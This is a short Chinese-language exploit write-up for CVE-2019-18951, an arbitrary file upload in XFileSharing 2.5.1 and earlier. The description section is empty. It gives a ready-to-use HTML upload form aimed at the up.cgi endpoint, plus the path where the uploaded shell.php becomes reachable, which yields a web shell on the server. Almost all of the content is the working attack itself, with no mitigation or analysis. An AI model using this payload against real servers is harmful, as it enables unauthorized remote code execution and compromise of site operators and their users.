---
title: "（CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell"
id: zhfly3284
---

# （CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell

## 一、漏洞简介

## 二、漏洞影响

Version: <=2.5.1

## 三、复现过程

### 任意文件上传

```
<form action="http://0-sec.org/cgi-bin/up.cgi" method="post" enctype="multipart/form-data">
    <input type="text" name="sid" value="joe">
    <input type="file" name="file">
    <input type="submit" value="Upload" name="submit">
</form> 
```

Shell : http://0-sec.org/cgi-bin/temp/joe/shell.php